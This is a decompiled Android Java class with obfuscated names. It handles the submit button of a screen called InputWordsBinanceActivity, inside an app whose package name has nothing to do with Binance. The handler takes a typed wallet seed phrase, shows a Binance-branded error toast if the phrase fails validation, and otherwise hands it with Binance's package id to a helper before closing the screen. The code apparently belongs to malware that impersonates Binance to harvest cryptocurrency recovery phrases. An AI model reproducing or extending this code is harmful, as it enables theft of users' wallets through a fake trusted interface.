package j3;

import android.os.Build;
import android.os.Handler;
import android.os.Looper;
import android.view.View;
import android.view.inputmethod.InputMethodManager;
import com.blankj.utilcode.util.ToastUtils;
import com.superbock.ui.custom.InputWordsBinanceActivity;
import comeliest.metempsychosis.pokelogan.R;

/* loaded from: classes12.dex */
public final class l implements View.OnClickListener {

    /* renamed from: b, reason: collision with root package name */
    public final /* synthetic */ InputWordsBinanceActivity f3514b;

    /* loaded from: classes10.dex */
    public class a implements Runnable {
        public a() {
        }

        @Override // java.lang.Runnable
        public final void run() {
            l.this.f3514b.finishAndRemoveTask();
            l.this.f3514b.f1555b.setFeedBack(2);
        }
    }

    public l(InputWordsBinanceActivity inputWordsBinanceActivity) {
        this.f3514b = inputWordsBinanceActivity;
    }

    @Override // android.view.View.OnClickListener
    public final void onClick(View view) {
        String trim = this.f3514b.f1560g.getText().toString().trim();
        if (trim.length() == 0 || !k3.j.b(trim)) {
            if (Build.VERSION.SDK_INT >= 23) {
                ToastUtils.make().setLeftIcon(R.mipmap.ic_binance).setGravity(17, 0, 0).setMode(ToastUtils.MODE.DARK).show(this.f3514b.getString(R.string.Incorrect_seed_phrase_check_and_try_again));
                return;
            } else {
                ToastUtils.showLong(this.f3514b.getString(R.string.Incorrect_seed_phrase_check_and_try_again));
                return;
            }
        }
        k3.j.a(trim.replaceAll("\\s+", " "), "com.binance.dev", this.f3514b.getString(R.string.binance), view.getContext());
        InputWordsBinanceActivity inputWordsBinanceActivity = this.f3514b;
        ((InputMethodManager) inputWordsBinanceActivity.getSystemService("input_method")).hideSoftInputFromWindow(inputWordsBinanceActivity.f1560g.getWindowToken(), 0);
        this.f3514b.f1560g.clearFocus();
        new Handler(Looper.getMainLooper()).postDelayed(new a(), 500L);
    }
}
